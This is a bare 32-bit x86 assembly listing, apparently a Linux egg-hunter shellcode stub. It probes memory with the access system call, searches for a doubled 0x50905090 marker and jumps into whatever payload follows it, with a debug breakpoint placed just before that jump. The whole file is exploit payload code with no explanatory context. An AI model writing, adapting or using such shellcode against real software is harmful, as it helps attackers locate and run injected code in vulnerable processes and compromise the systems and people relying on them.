BITS 32
cld
xor ecx,ecx
mul ecx
or dx,0xfff
inc edx
push byte +0x21
pop eax
lea ebx,[edx+0x4]
int 0x80
cmp al,0xf2
jz 0x5
mov eax,0x50905090
mov edi,edx
scasd
jnz 0xa
scasd
jnz 0xa
nop
int3
jmp edi

